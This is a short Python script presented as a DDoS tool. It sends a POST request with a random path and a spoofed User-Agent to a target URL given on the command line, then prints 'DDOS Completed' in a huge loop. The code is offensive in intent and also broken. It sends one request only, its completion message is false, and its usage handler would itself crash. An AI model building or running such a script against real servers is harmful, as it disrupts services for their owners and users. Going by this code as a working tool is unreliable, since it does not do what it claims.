import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random
import string

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[1])
        sys.exit(-1)
uri = "/="
headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"
            
}

#Define random strings
letters_lower = string.ascii_lowercase
result_str = ''.join(random.choice(letters_lower) for i in range(50))

    
r = requests.post(url + uri + result_str, headers=headers, verify=False)
for r in range (20000000000):
    print("DDOS Completed")